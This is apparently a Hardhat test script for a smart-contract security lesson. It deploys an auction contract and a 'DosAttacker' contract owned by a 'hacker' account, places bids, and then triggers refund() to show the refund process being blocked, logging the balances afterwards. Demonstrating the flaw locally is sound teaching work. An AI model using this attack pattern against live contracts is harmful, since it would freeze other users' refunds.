const hre = require('hardhat');
const ethers = hre.ethers;

module.exports = async function main(args) {
  const [user1, user2, hacker] = await ethers.getSigners();

  const AuctionFactory = await ethers.getContractFactory(args['contract'], user1);
  const auction = await AuctionFactory.deploy();
  await auction.waitForDeployment();

  const DosAttackerFactory = await ethers.getContractFactory("DosAttacker", hacker);
  const attacker = await DosAttackerFactory.deploy(auction.getAddress());
  await attacker.waitForDeployment();

  const txBid = await auction.bid({value: ethers.parseEther('5.0')});
  await txBid.wait();

  const txAttackBid = await attacker.connect(hacker).bid({value: 100});
  await txAttackBid.wait();

  const txUserBid = await auction.connect(user2).bid({
    value: ethers.parseEther('6.0')
  });
  await txUserBid.wait();

  console.log("Auction balance", await ethers.provider.getBalance(auction.getAddress()));

  try {
    const txRefund = await auction.refund();
    await txRefund.wait();
  } catch(e) {
    console.error(e.message);
  } finally {
    console.log("Refund progress", await auction.refundProgress());

    console.log("User 1 balance", await ethers.provider.getBalance(user1.getAddress()));
    console.log("Hacker balance", await ethers.provider.getBalance(hacker.getAddress()));
    console.log("User 2 balance", await ethers.provider.getBalance(user2.getAddress()));
  }
}
